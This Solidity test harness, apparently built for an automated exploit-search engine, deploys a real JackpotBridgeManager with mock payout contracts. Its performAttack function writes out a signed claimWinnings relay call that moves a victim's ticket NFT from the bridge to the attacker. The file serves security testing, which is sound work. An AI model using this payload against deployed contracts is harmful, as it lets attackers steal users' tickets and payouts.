// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

// SUPPLIED SETUP HARNESS for the repository under test (DATA, not engine
// code). Deploys the minimal real stack around the contract under test:
// the bridge manager itself is the REAL repository contract; the payout
// core and token are stand-ins that provide "attacker has a winning
// entry" state. The engine-generated GenericAttacker plays the
// approved-spender + safe-transfer-receiver role.
//
// Implements the IProtocolHarness shape expected by the generated driver.

import { IJackpot } from "contracts/interfaces/IJackpot.sol";
import { JackpotBridgeManager } from "contracts/JackpotBridgeManager.sol";
import { JackpotTicketNFT } from "contracts/JackpotTicketNFT.sol";
import { USDCMock } from "contracts/mocks/USDCMock.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";

interface VmCheat {
    function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32);
    function addr(uint256) external returns (address);
}

interface IERC721SafeTransfer3 {
    function safeTransferFrom(address, address, uint256) external;
}

contract BridgeManagerSetupHarness {
    VmCheat internal constant VM =
        VmCheat(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    uint256 internal constant ATTACKER_KEY = 0xA77AC5;
    uint256 internal constant TICKET_PRICE = 1_000_000;
    uint256 internal constant PAYOUT = 10_000_000;

    USDCMock internal usdc;
    JackpotTicketNFT internal ticketNft;
    PayoutCore internal core;
    JackpotBridgeManager internal bridge;

    uint256 internal victimTicketId;
    uint256[] internal attackerTicketIds;

    function setup() external {
        usdc = new USDCMock(10 ** 24, "Payout USD", "PUSD");
        core = new PayoutCore();
        ticketNft = new JackpotTicketNFT(IJackpot(address(core)));
        core.bind(ticketNft, IERC20(address(usdc)), PAYOUT);
        bridge = new JackpotBridgeManager(
            IJackpot(address(core)),
            ticketNft,
            IERC20(address(usdc)),
            "BridgeValidation",
            "1"
        );

        // payout liquidity for the winning-entry stand-in
        usdc.transfer(address(core), 1_000_000_000);

        // victim entry (ticket #1) and attacker entry (ticket #2),
        // both bought through the real bridge path so the NFTs sit in
        // the bridge and the ownership mapping points at the buyers
        usdc.approve(address(bridge), TICKET_PRICE * 2);
        IJackpot.Ticket[] memory one = new IJackpot.Ticket[](1);
        one[0] = IJackpot.Ticket({normals: _normals(), bonusball: 6});

        bridge.buyTickets(one, address(0xBEEF), new address[](0), new uint256[](0), "h");
        bridge.buyTickets(
            one, VM.addr(ATTACKER_KEY), new address[](0), new uint256[](0), "h"
        );

        victimTicketId = 1;
        attackerTicketIds.push(2);
    }

    function protocolAccount() external view returns (address) {
        return address(bridge);
    }

    function performAttack(address attacker)
        external returns (bool ok, bytes memory ret)
    {
        JackpotBridgeManager.RelayTxData memory relay =
            JackpotBridgeManager.RelayTxData({
                approveTo: attacker,
                to: address(ticketNft),
                data: abi.encodeCall(
                    IERC721SafeTransfer3.safeTransferFrom,
                    (address(bridge), attacker, victimTicketId)
                )
            });
        bytes32 eipHash =
            bridge.createClaimWinningsEIP712Hash(attackerTicketIds, relay);
        (uint8 v, bytes32 r, bytes32 s) = VM.sign(ATTACKER_KEY, eipHash);
        (ok, ret) = address(bridge).call(
            abi.encodeCall(
                JackpotBridgeManager.claimWinnings,
                (attackerTicketIds, relay, abi.encodePacked(r, s, v))
            )
        );
    }

    function probedAsset() external view returns (address) {
        return address(usdc);
    }

    function probedAssetBalance(address who) external view returns (uint256) {
        return usdc.balanceOf(who);
    }

    function crossAssetCount() external view returns (uint256) {
        return 1;
    }

    function crossAssetAt(uint256) external view returns (address) {
        return address(ticketNft);
    }

    function crossAssetHeldBy(address, address who) external view returns (uint256) {
        return ticketNft.balanceOf(who);
    }

    function _normals() private pure returns (uint8[] memory n) {
        n = new uint8[](5);
        n[0] = 1; n[1] = 2; n[2] = 3; n[3] = 4; n[4] = 5;
    }
}

/// Winning-entry stand-in: satisfies the IJackpot surface the bridge
/// actually uses (ticket price, drawing id, ticket minting on purchase,
/// payout on claim). The contract under test remains the real bridge.
contract PayoutCore is IJackpot {
    JackpotTicketNFT public ticketNft;
    IERC20 public payoutToken;
    uint256 public payoutPerTicket;
    uint256 public nextTicketId = 1;
    address public owner;

    constructor() { owner = msg.sender; }

    function bind(JackpotTicketNFT nft, IERC20 token, uint256 payout)
        external
    {
        require(msg.sender == owner && address(ticketNft) == address(0));
        ticketNft = nft;
        payoutToken = token;
        payoutPerTicket = payout;
    }

    function ticketPrice() external view returns (uint256) {
        return 1_000_000;
    }

    function currentDrawingId() external view returns (uint256) {
        return 1;
    }

    function buyTickets(
        IJackpot.Ticket[] memory _tickets,
        address _recipient,
        address[] memory,
        uint256[] memory,
        bytes32
    ) external returns (uint256[] memory ids) {
        ids = new uint256[](_tickets.length);
        for (uint256 i = 0; i < _tickets.length; i++) {
            ids[i] = nextTicketId++;
            ticketNft.mintTicket(_recipient, ids[i], 1, 0, bytes32(0));
        }
    }

    function claimWinnings(uint256[] memory _userTicketIds) external {
        payoutToken.transfer(msg.sender, _userTicketIds.length * payoutPerTicket);
    }

    function getUnpackedTicket(uint256, uint256)
        external pure returns (uint8[] memory normals, uint8 bonusball)
    {
        normals = new uint8[](0);
        bonusball = 0;
    }
}
